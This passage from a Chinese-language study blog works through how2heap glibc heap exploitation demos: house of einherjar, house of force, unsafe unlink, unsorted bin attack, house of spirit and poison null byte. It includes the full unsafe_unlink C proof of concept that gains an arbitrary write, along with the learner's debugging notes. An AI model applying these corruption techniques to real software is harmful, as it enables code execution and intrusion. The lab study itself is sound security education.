+<p>所以主要的就是伪造的栈地址需要满足size字段，之后fd改为size-0x8</p>
+<p>之后malloc得到的地址就是size+0x10</p>
+<h2 id="house-of-einherjar"><a href="#house-of-einherjar" class="headerlink" title="house_of_einherjar"></a>house_of_einherjar</h2><p>使用条件：<strong>单字节越界（off-by-one）</strong>，可以向一块 malloc 分配出的堆块写入一个空字节（null byte）的场景</p>
+<p>unlink checks</p>
+<p>复用机制：</p>
+<p><strong>如果前一个块还在用，我这个块的 <code>prev_size</code> 就借给他当数据区用。</strong></p>
+<p>不多说了兄弟们，看了翻译就是一个堆块溢出之后，修改下一个的presize字段（还需要考虑unlink机制），之后的话，直接free就行了吧应该</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">gcc -g -O0 -o <span class="hljs-number">1</span> <span class="hljs-number">1.</span>c<br></code></pre></td></tr></table></figure>
+
+<p><img src="/pwn-notes/images/notes/image-20261028103837602.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20261028103837602"></p>
+<p>首先就是申请一个小堆块</p>
+<p>我去原来第一个堆块加上的大小不是0x10而是0x8，前面的pre_size字段被复用了</p>
+<p><img src="/pwn-notes/images/notes/image-20261028104220458.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20261028104220458"></p>
+<p>而且</p>
+<p><img src="/pwn-notes/images/notes/image-20261028104325734.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20261028104325734"></p>
+<p><img src="/pwn-notes/images/notes/image-20261028104354983.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20261028104354983"></p>
+<p>所以大小是0x40字节</p>
+<p>然后接下来需要真实的chunka大小</p>
+<p><img src="/pwn-notes/images/notes/image-20261028104602563.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20261028104602563"></p>
+<p>接下来伪造fake_chunk</p>
+<p><img src="/pwn-notes/images/notes/image-20261028104710928.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20261028104710928"></p>
+<p><img src="/pwn-notes/images/notes/image-20261028111924432.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20261028111924432"></p>
+<p>然后申请的是0xf8大小的</p>
+<p><img src="/pwn-notes/images/notes/image-20261028104836598.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20261028104836598"></p>
+<p><img src="/pwn-notes/images/notes/image-20261028104910324.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20261028104910324"></p>
+<p>接下来直接溢出</p>
+<p><img src="/pwn-notes/images/notes/image-20261028112954764.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20261028112954764"></p>
+<p><img src="/pwn-notes/images/notes/image-20261028113116376.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20261028113116376"></p>
+<p>可以看到b的size字段低位变成0</p>
+<p>接下来好像是直接算偏移，用b的chunk地址减去伪造fake_chunk的地址，这应该是大小吧</p>
+<p><img src="/pwn-notes/images/notes/image-20261028113556663.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20261028113556663"></p>
+<p>可以看到b的pre_size字段已经被修改了</p>
+<p><img src="/pwn-notes/images/notes/image-20261028113744757.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20261028113744757"></p>
+<p>这应该就是计算过程</p>
+<p><img src="/pwn-notes/images/notes/image-20261028113844704.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20261028113844704"></p>
+<p>fake[chunk1]&#x3D;fake_size</p>
+<p><img src="/pwn-notes/images/notes/image-20261028113930492.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20261028113930492"></p>
+<p><img src="/pwn-notes/images/notes/image-20261028114229310.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20261028114229310"></p>
+<p>free（b）之后的效果</p>
+<p><img src="/pwn-notes/images/notes/image-20261028114804832.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20261028114804832"></p>
+<p>fake_chunk的大小改变了，</p>
+<p><img src="/pwn-notes/images/notes/image-20261028115346751.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20261028115346751"></p>
+<p>接下来申请堆块</p>
+<p><img src="/pwn-notes/images/notes/image-20261028115414287.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20261028115414287"></p>
+<p><img src="/pwn-notes/images/notes/image-20261028115450441.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20261028115450441"></p>
+<p>可以看到，申请的堆首地址是我们伪造的fake_chunk,接下来就可以在此修改内容</p>
+<p>嘶就是堆块重叠，之后的话，伪造堆块（需要注意绕过unlink机制，之后再次申请堆块需要绕过检查），堆溢出修改pre_size的标志位，</p>
+<p>之后修改伪造堆块的size,改成计算出来的pre_size,之后的话就可以free,之后再次申请，就可以得到我们伪造堆块的地址，进而修改其内容。</p>
+<h2 id="house-of-force（任意地址写）"><a href="#house-of-force（任意地址写）" class="headerlink" title="house_of_force（任意地址写）"></a>house_of_force（任意地址写）</h2><p>哦，这个是修改top_chunk的size字段，使得直接从top_chunk分配相应大小的堆块</p>
+<p>相应操作记起来好像只有，将top_chunk字段改为-1,当然需要首先安防一个小堆块用来堆溢出，之后free这个小堆块之后，（这里好像并没有和top_chunk合并）会和top_chunk合并，因为我们申请的是一个大堆块。之后就会直接从top_chunk分配，有啥用？只是申请一个地址吗？</p>
+<p>原来是通过修改top_chunk的相关偏移，得到申请堆块的大小，进而实现任意地址写</p>
+<p><img src="/pwn-notes/images/notes/image-20261028151922821.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20261028151922821"></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">gcc -g -O0 -o <span class="hljs-number">1</span> <span class="hljs-number">1.</span>c<br></code></pre></td></tr></table></figure>
+
+<p>首先我们想要下下一次分配的地址是目标地址：</p>
+<p>new_top&#x3D;target-0x10(这样的话下一次malloc才会分配（new_top+0x10&#x3D;target）)</p>
+<p>那么我们第一次请求的大小是多少？</p>
+<p>首先new_top&#x3D;old_top+nb(malloc.size+0x10)</p>
+<p>而 new_top&#x3D;target-0x10&#x3D;old_top+nb(malloc.size+0x10)</p>
+<p>所以malloc.size&#x3D;target-0x20-old_top</p>
+<p>这个就是我们想要请求的大小</p>
+<p>接下来直接调：</p>
+<p><img src="/pwn-notes/images/notes/image-20261028152912666.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20261028152912666"></p>
+<p>首先申请0x100大小的堆块</p>
+<p><img src="/pwn-notes/images/notes/image-20261028152945959.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20261028152945959"></p>
+<p><img src="/pwn-notes/images/notes/image-20261028153103287.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20261028153103287"></p>
+<p>接下来知道top_chunk的地址</p>
+<p><img src="/pwn-notes/images/notes/image-20261028153239486.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20261028153239486"></p>
+<p><img src="/pwn-notes/images/notes/image-20261028153257103.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20261028153257103"></p>
+<p>接下来修改top_chunk的大小</p>
+<p><img src="/pwn-notes/images/notes/image-20261028153508489.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20261028153508489"></p>
+<p><img src="/pwn-notes/images/notes/image-20261028153723098.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20261028153723098"></p>
+<p>虽然上面会提示一大堆，但是最终还是修改完成了</p>
+<p>接下来就是计算我们需要申请的大小</p>
+<p><img src="/pwn-notes/images/notes/image-20261028153849818.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20261028153849818"></p>
+<p>进行申请</p>
+<p><img src="/pwn-notes/images/notes/image-20261028154549845.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20261028154549845"></p>
+<p>接下来会申请堆块，获得的malloc地址就是我们的target_addr</p>
+<p><img src="/pwn-notes/images/notes/image-20261028155115270.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20261028155115270"></p>
+<p>接下来修改内容</p>
+<p><img src="/pwn-notes/images/notes/image-20261028155324955.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20261028155324955"></p>
+<p><img src="/pwn-notes/images/notes/image-20261028163551997.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20261028163551997"></p>
+<p>可以看到相关的内容确实被改写了</p>
+<p>希望不要忘记</p>
+<p>接下来我就挑一点值得复现的做做</p>
+<h2 id="unsafe-unlink"><a href="#unsafe-unlink" class="headerlink" title="unsafe_unlink"></a>unsafe_unlink</h2><p>脱链吗？希望之前看的一部分还有点用</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;assert.h&gt;</span></span><br><br><span class="hljs-type">uint64_t</span> *chunk0_ptr;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>  setbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-literal">NULL</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Welcome to unsafe unlink 2.0!\n&quot;</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Tested in Ubuntu 14.04/16.04 64bit.\n&quot;</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;This technique can be used when you have a pointer at a known location to a region you can call unlink on.\n&quot;</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;The most common scenario is a vulnerable buffer that can be overflown and has a global pointer.\n&quot;</span>);<br><br>  <span class="hljs-type">int</span> malloc_size = <span class="hljs-number">0x80</span>; <span class="hljs-comment">//we want to be big enough not to use fastbins</span><br>  <span class="hljs-type">int</span> header_size = <span class="hljs-number">2</span>;<br><br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;The point of this exercise is to use free to corrupt the global chunk0_ptr to achieve arbitrary memory write.\n\n&quot;</span>);<br><br>  chunk0_ptr = (<span class="hljs-type">uint64_t</span>*) <span class="hljs-built_in">malloc</span>(malloc_size); <span class="hljs-comment">//chunk0</span><br>  <span class="hljs-type">uint64_t</span> *chunk1_ptr  = (<span class="hljs-type">uint64_t</span>*) <span class="hljs-built_in">malloc</span>(malloc_size); <span class="hljs-comment">//chunk1</span><br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;The global chunk0_ptr is at %p, pointing to %p\n&quot;</span>, &amp;chunk0_ptr, chunk0_ptr);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;The victim chunk we are going to corrupt is at %p\n\n&quot;</span>, chunk1_ptr);<br><br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;We create a fake chunk inside chunk0.\n&quot;</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;We setup the &#x27;next_free_chunk&#x27; (fd) of our fake chunk to point near to &amp;chunk0_ptr so that P-&gt;fd-&gt;bk = P.\n&quot;</span>);<br>  chunk0_ptr[<span class="hljs-number">2</span>] = (<span class="hljs-type">uint64_t</span>) &amp;chunk0_ptr-(<span class="hljs-keyword">sizeof</span>(<span class="hljs-type">uint64_t</span>)*<span class="hljs-number">3</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;We setup the &#x27;previous_free_chunk&#x27; (bk) of our fake chunk to point near to &amp;chunk0_ptr so that P-&gt;bk-&gt;fd = P.\n&quot;</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;With this setup we can pass this check: (P-&gt;fd-&gt;bk != P || P-&gt;bk-&gt;fd != P) == False\n&quot;</span>);<br>  chunk0_ptr[<span class="hljs-number">3</span>] = (<span class="hljs-type">uint64_t</span>) &amp;chunk0_ptr-(<span class="hljs-keyword">sizeof</span>(<span class="hljs-type">uint64_t</span>)*<span class="hljs-number">2</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Fake chunk fd: %p\n&quot;</span>,(<span class="hljs-type">void</span>*) chunk0_ptr[<span class="hljs-number">2</span>]);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Fake chunk bk: %p\n\n&quot;</span>,(<span class="hljs-type">void</span>*) chunk0_ptr[<span class="hljs-number">3</span>]);<br><br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;We assume that we have an overflow in chunk0 so that we can freely change chunk1 metadata.\n&quot;</span>);<br>  <span class="hljs-type">uint64_t</span> *chunk1_hdr = chunk1_ptr - header_size;<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;We shrink the size of chunk0 (saved as &#x27;previous_size&#x27; in chunk1) so that free will think that chunk0 starts where we placed our fake chunk.\n&quot;</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;It&#x27;s important that our fake chunk begins exactly where the known pointer points and that we shrink the chunk accordingly\n&quot;</span>);<br>  chunk1_hdr[<span class="hljs-number">0</span>] = malloc_size;<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;If we had &#x27;normally&#x27; freed chunk0, chunk1.previous_size would have been 0x90, however this is its new value: %p\n&quot;</span>,(<span class="hljs-type">void</span>*)chunk1_hdr[<span class="hljs-number">0</span>]);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;We mark our fake chunk as free by setting &#x27;previous_in_use&#x27; of chunk1 as False.\n\n&quot;</span>);<br>  chunk1_hdr[<span class="hljs-number">1</span>] &amp;= ~<span class="hljs-number">1</span>;<br><br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Now we free chunk1 so that consolidate backward will unlink our fake chunk, overwriting chunk0_ptr.\n&quot;</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;You can find the source of the unlink macro at https://sourceware.org/git/?p=glibc.git;a=blob;f=malloc/malloc.c;h=ef04360b918bceca424482c6db03cc5ec90c3e00;hb=07c18a008c2ed8f5660adba2b778671db159a141#l1344\n\n&quot;</span>);<br>  <span class="hljs-built_in">free</span>(chunk1_ptr);<br><br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;At this point we can use chunk0_ptr to overwrite itself to point to an arbitrary location.\n&quot;</span>);<br>  <span class="hljs-type">char</span> victim_string[<span class="hljs-number">8</span>];<br>  <span class="hljs-built_in">strcpy</span>(victim_string,<span class="hljs-string">&quot;Hello!~&quot;</span>);<br>  chunk0_ptr[<span class="hljs-number">3</span>] = (<span class="hljs-type">uint64_t</span>) victim_string;<br><br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;chunk0_ptr is now pointing where we want, we use it to overwrite our victim string.\n&quot;</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Original value: %s\n&quot;</span>,victim_string);<br>  chunk0_ptr[<span class="hljs-number">0</span>] = <span class="hljs-number">0x4141414142424242L</span>L;<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;New Value: %s\n&quot;</span>,victim_string);<br><br>  <span class="hljs-comment">// sanity check</span><br>  assert(*(<span class="hljs-type">long</span> *)victim_string == <span class="hljs-number">0x4141414142424242L</span>);<br>&#125;<br><br><br></code></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">gcc -g -O0 -o 1 1.c<br></code></pre></td></tr></table></figure>
+
+<p>额，我觉得就是在原来的第一个堆块上伪造相应的fd和bk（所以最后），着重伪造的应该是</p>
+<p>其fd字段和bk字段</p>
+<p>fd:fakechunk-0x18    bk:fakechunk-0x10</p>
+<p>之后再次篡改下一个堆块的pre_size的大小和标志位，在free这个堆块的时候就会触发unlink</p>
+<p>这个时候我们伪造的堆块就会起作用，</p>
+<p><img src="/pwn-notes/images/notes/image-20261028174812894.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20261028174812894"></p>
+<p>之后就修改原本指针指向的地址。有点乱</p>
+<p>调一下：</p>
+<p>首先申请一个0x80大小的堆块chunk0</p>
+<p><img src="/pwn-notes/images/notes/image-20261028175519431.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20261028175519431"></p>
+<p>接下来又申请一个0x80大小的堆块为chunk1</p>
+<p><img src="/pwn-notes/images/notes/image-20261029144743903.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20261029144743903"></p>
+<p>chunk1也可以了</p>
+<p><img src="/pwn-notes/images/notes/image-20261029150024128.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20261029150024128"></p>
+<p>好吧，这两个指针有点耐人寻味</p>
+<p>也就是说这个指针在内存中的地址是</p>
+<p>0x602078</p>
+<p>而它实际指向的的是</p>
+<p>0x603010</p>
+<p>接下来在chunk0里面创建fake_chunk</p>
+<p><img src="/pwn-notes/images/notes/image-20261029150856724.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20261029150856724"></p>
+<p>这是一开始创建的chunk0</p>
+<p>接下来执行完这一句之后</p>
+<p><img src="/pwn-notes/images/notes/image-20261029151024898.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20261029151024898"></p>
+<p><img src="/pwn-notes/images/notes/image-20261029151116123.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20261029151116123"></p>
+<p>伪造的fd被写入进去</p>
+<p>接下来是伪造的bk</p>
+<p><img src="/pwn-notes/images/notes/image-20261029151244533.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20261029151244533"></p>
+<p>接下来应该修改的是chunk1的pre_size位置</p>
+<p><img src="/pwn-notes/images/notes/image-20261029152822009.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20261029152822009"></p>
+<p>可以看到确实是被换成了0x80</p>
+<p>但是我们需要伪造的是前一个堆块被释放的状态，所以，还需要修改其size位最后字节为0</p>
+<p><img src="/pwn-notes/images/notes/image-20261029153046744.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20261029153046744"></p>
+<p>修改完成，但是应该还需要修改fake_chunk的size位，以至于更好通过检查。额，好i谢谢昂不对</p>
+<p><img src="/pwn-notes/images/notes/image-20261029153330702.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20261029153330702"></p>
+<p>居然直接free掉堆块了吗</p>
+<p><img src="/pwn-notes/images/notes/image-20261029153621529.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20261029153621529"></p>
+<p>这是释放完之后的样子，bins里什么都没有</p>
+<p><img src="/pwn-notes/images/notes/image-20261029153704557.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20261029153704557"></p>
+<p>我去，怎么指过去的？</p>
+<p><img src="/pwn-notes/images/notes/image-20261029154646723.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20261029154646723"></p>
+<p>（额）原来chunk0的指针存在0x602078这个位置，然后指向的是0x603010</p>
+<p>之后触发unlink机制，之后的话</p>
+<p>最后一句是</p>
+<p>BK-fd&#x3D;FD</p>
+<p>而FD就是0x602078-0x18&#x3D;0x602060</p>
+<p>所以就是将0x602078指向的内容从0x603010变成0x602060</p>
+<p>所以此时的chunk0也就是0x602078还以为指向的是0x603010,但是其实已经变成0x602060</p>
+<p>所以chunk0[3]就是0x602078,之后再次将这个地址里面写入栈上地址，之后</p>
+<p>看这：：：：：：：</p>
+<p>也就是一开始&amp;chunk0是0x602078指向的是0x603010,之后的话，改成了0x602060,而现在chunk[3] (修改其指向的内容为栈上地址)，之后修改chunk[0]就会变成修改栈上内容了</p>
+<p><img src="/pwn-notes/images/notes/image-20261029155946398.png" srcset="/pwn-notes/img/loading.gif" lazyload></p>
+<p><img src="/pwn-notes/images/notes/image-20261029163320021.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20261029163320021"></p>
+<p>修改完之后直接修改数据即可。</p>
+<p>这就是unlink实现任意地址写。服了。</p>
+<h2 id="unsorted-bin-attack"><a href="#unsorted-bin-attack" class="headerlink" title="unsorted_bin_attack"></a>unsorted_bin_attack</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">gcc -g -O0 -o 1 1.c<br></code></pre></td></tr></table></figure>
+
+<p>反正这个就是任意地址写入大数据</p>
+<p><img src="/pwn-notes/images/notes/image-20261031103616274.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20261031103616274"></p>
+<p>只需要将目标地址-0x10写入即将进入的unsortedbin</p>
+<p>之后在进入unsoretdbin之后再次申请之后就可以触发相关的攻击写入</p>
+<p>首先</p>
+<p><img src="/pwn-notes/images/notes/image-20261031104441800.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20261031104441800"></p>
+<p><img src="/pwn-notes/images/notes/image-20261031104816213.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20261031104816213"></p>
+<p>可以看到已经有数据是一开始设置的0</p>
+<p>之后申请大堆块</p>
+<p><img src="/pwn-notes/images/notes/image-20261031110714763.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20261031110714763"></p>
+<p>首先设置指针p指向堆块内容区</p>
+<p>之后直接</p>
+<p><img src="/pwn-notes/images/notes/image-20261031111531658.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20261031111531658"></p>
+<p>接着再申请一个防止free之后与topchunk合并</p>
+<p><img src="/pwn-notes/images/notes/image-20261031111858342.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20261031111858342"></p>
+<p>接下来应该是将target-0x10写入其bk位置</p>
+<p><img src="/pwn-notes/images/notes/image-20261031112155237.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20261031112155237"></p>
+<p>首先是free之后再写入</p>
+<p><img src="/pwn-notes/images/notes/image-20261031112230857.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20261031112230857"></p>
+<p>已经进入unsortedbin,</p>
+<p><img src="/pwn-notes/images/notes/image-20261031112307913.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20261031112307913"></p>
+<p>所以说在最后触发攻击的时候是在释放的时候</p>
+<p><img src="/pwn-notes/images/notes/image-20261031122038219.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20261031122038219"></p>
+<p><img src="/pwn-notes/images/notes/image-20261031122203741.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20261031122203741"></p>
+<p>接下来就是将目标地址-0x10放进bk，最后就可以</p>
+<p><img src="/pwn-notes/images/notes/image-20261031122705021.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20261031122705021"></p>
+<p>已经写进去了，之后直接malloc</p>
+<p><img src="/pwn-notes/images/notes/image-20261031122827004.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20261031122827004"></p>
+<p>看到68位置的值已经被修改了</p>
+<p>反正应该就是只要大于0x80就可以</p>
+<p>放进去</p>
+<h2 id="house-of-spirit"><a href="#house-of-spirit" class="headerlink" title="house of spirit"></a>house of spirit</h2><p>首先申请一个小堆块</p>
+<p><img src="/pwn-notes/images/notes/image-20261031155157719.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20261031155157719"></p>
+<p>接下来应该是在栈上寻找一个合适的位置来放置合适的假堆块</p>
+<p><img src="/pwn-notes/images/notes/image-20261031161050242.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20261031161050242"></p>
+<p>修改fake_chunk的size</p>
+<p><img src="/pwn-notes/images/notes/image-20261031161501216.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20261031161501216"></p>
+<p>之后修改另一个</p>
+<p>然后是将堆指针改成db20哪个位置</p>
+<p><img src="/pwn-notes/images/notes/image-20261031162531704.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20261031162531704"></p>
+<p><img src="/pwn-notes/images/notes/image-20261031164746229.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20261031164746229"></p>
+<p>接下来接着申请0x30的堆块就可以</p>
+<p>获取到栈地址上的堆块了</p>
+<p><img src="/pwn-notes/images/notes/image-20261031170158895.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20261031170158895"></p>
+<p>你有空好好看吧</p>
+<h2 id="poison-null-byte"><a href="#poison-null-byte" class="headerlink" title="poison_null_byte"></a>poison_null_byte</h2><p>调一下</p>
+<p>申请一个0x100的堆块</p>
+<p><img src="/pwn-notes/images/notes/image-20261102100613877.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20261102100613877"></p>
+<p>接着申请三个堆块，最后那一个是用来防止合并的</p>
+<p><img src="/pwn-notes/images/notes/image-20261102100805816.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20261102100805816"></p>
+<p><img src="/pwn-notes/images/notes/image-20261102101149747.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20261102101149747"></p>
+<p><img src="/pwn-notes/images/notes/image-20261102103317798.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20261102103317798"></p>
+<p>这一步就是为了绕过相关检查机制，因为现在它的大小已经被改成0x200所以接下来就会去下方0x200大小的地方寻找相邻堆块的pre_size位置，之后就会绕过检查</p>
+<p><img src="/pwn-notes/images/notes/image-20261102103816165.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20261102103816165"></p>
+<p>接下来就free并且修改chunkb 的size字段</p>
+<p><img src="/pwn-notes/images/notes/image-20261102104726964.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20261102104726964"></p>
+<p><img src="/pwn-notes/images/notes/image-20261102104758758.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20261102104758758"></p>
+<p>size字段已经修改完成</p>
+<!-- sync-hash: 67ab57d1d02320a524df17e76269e3cd228c49b5738c22c6924f29bffd6c9f26 -->
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/pwn-notes/categories/%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/" class="category-chain-item">题目复现</a>
+  
+  
+    <span>></span>
+    
+  <a href="/pwn-notes/categories/%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/how2heap/" class="category-chain-item">how2heap</a>
+  
+  
+
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/pwn-notes/tags/UAF/" class="print-no-link">#UAF</a>
+      
+        <a href="/pwn-notes/tags/unlink/" class="print-no-link">#unlink</a>
+      
+        <a href="/pwn-notes/tags/fastbin/" class="print-no-link">#fastbin</a>
+      
+        <a href="/pwn-notes/tags/unsorted-bin/" class="print-no-link">#unsorted-bin</a>
+      
+        <a href="/pwn-notes/tags/double-free/" class="print-no-link">#double-free</a>
+      
+        <a href="/pwn-notes/tags/HouseOfSpirit/" class="print-no-link">#HouseOfSpirit</a>
+      
+        <a href="/pwn-notes/tags/malloc-consolidate/" class="print-no-link">#malloc-consolidate</a>
+      
+        <a href="/pwn-notes/tags/glibc2-35/" class="print-no-link">#glibc2.35</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>HOW2HEAP</div>
+      <div>https://henan808.github.io/pwn-notes/2026/11/13/sync-typora-pwn-how2heap-c67585/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>henan808</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2026年11月13日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
